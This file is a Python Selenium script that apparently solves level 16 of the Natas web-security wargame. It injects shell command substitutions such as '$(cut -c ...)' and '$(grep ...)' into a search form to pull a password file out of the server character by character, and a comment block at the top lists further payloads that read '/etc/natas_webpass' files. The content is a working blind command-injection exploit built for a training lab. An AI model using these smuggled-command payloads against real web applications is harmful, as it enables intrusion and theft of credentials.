from common import *

# commands to remember:
'^$(cut -c 2-2 /etc/natas_webpass/natas17)'
'echo $(sed -n 31p simulators/16-source.php | cut -c 26-26)hi there'      # if i find a way to get pipe to work, this will be the way to go, let's me get \ 
'printf $(dd ibs=1 skip=1113 count=1 if=index.php 2>/dev/null)042'   # prints "! we're done! and 073 is ;

# this is useless, because it's just added as part of the string, doesn't really escape.
# def gen_char(char):
#     return f'$(printf $(dd ibs=1 skip=1113 count=1 if=index.php 2>/dev/null){oct(ord(char))[2:].zfill(3)})'

def solve(driver, last_password):
    driver.get(build_url(level=16))
    
    password = ""
    for x in range(len(last_password)): # all passwords are the same length
        # ask for words starting with the x letter of the password
        driver.find_element(By.XPATH, '//*[@id="content"]/form/input[1]').send_keys(f'^$(cut -c {x+1}-{x+1} {build_webpass_path(17)})')
        driver.find_element(By.XPATH, '//*[@id="content"]/form/input[2]').click()

        WebDriverWait(driver, 10).until(lambda driver: driver.find_element(By.XPATH, '//*[@id="content"]/pre'))
        results = driver.find_element(By.XPATH, '//*[@id="content"]/pre').text.split()
        if len(results) == 0:
            # it's a number, we're gonna convert to hex after adding 5 or 10, and try again. if it's still empty, it's an error
            for j in [5,10]:
                driver.find_element(By.XPATH, '//*[@id="content"]/form/input[1]').send_keys(f'^$(printf %x $(expr {j} + $(cut -c {x+1}-{x+1} {build_webpass_path(17)})))')
                driver.find_element(By.XPATH, '//*[@id="content"]/form/input[2]').click()
                
                WebDriverWait(driver, 10).until(lambda driver: driver.find_element(By.XPATH, '//*[@id="content"]/pre'))
                results = driver.find_element(By.XPATH, '//*[@id="content"]/pre').text.split()
                if len(results) != 0:
                    letter = results[0][0]
                    number = int(letter, 16) - j
                    password += str(number)
                    break
            else:
                raise RuntimeError(f"Could not find letter {x} of the password, seems to be a number but hex method isn't working.")
            
        else:
            # it's a letter, we're gonna find if it's capital or lowercase, and then add it to the password
            letter = results[0][0]
            # now we need to find if it's capital or lowercase. empty result means
            base_word = "blubbers"  # if any letter comes after it, it's not in the dictionary, i checked.
            position_string = "{" + str(x) + "}"
            
            driver.find_element(By.XPATH, '//*[@id="content"]/form/input[1]').send_keys(f'^.{base_word}$(grep ^{position_string}{letter.lower()} {build_webpass_path(17)})')
            driver.find_element(By.XPATH, '//*[@id="content"]/form/input[2]').click()
            
            WebDriverWait(driver, 10).until(lambda driver: driver.find_element(By.XPATH, '//*[@id="content"]/pre'))
            results1 = driver.find_element(By.XPATH, '//*[@id="content"]/pre').text.split()
            
            if len(results1) == 0:
                # it's lowercase
                password += letter.lower()
            else:
                password += letter.upper()
            
        print("password: ", password, end = '\r')
    print()
    
    driver.get(build_url(password = password, level=17))
    return password